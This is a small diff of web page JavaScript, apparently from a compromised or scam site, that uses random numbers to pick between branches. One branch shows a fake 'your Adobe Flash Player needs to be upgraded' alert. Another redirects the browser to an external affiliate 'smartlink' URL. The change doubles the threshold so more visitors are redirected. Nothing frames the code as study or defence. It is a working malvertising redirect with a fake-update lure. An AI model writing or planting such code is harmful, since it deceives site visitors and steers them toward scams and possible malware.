@@ -9,7 +9,7 @@ function randomNum(minNum,maxNum){
 			{
 				alert("Oh, it seems that your Adobe Flash Player needs to be upgraded. Please download the latest version and install it")
 			}
-			else if (num < 300)
+			else if (num < 600)
 			{
 				window.location.href='https://smrtsecure-dt.com/smartlink/?a=136882&sm=8892&mt=24';
 			}
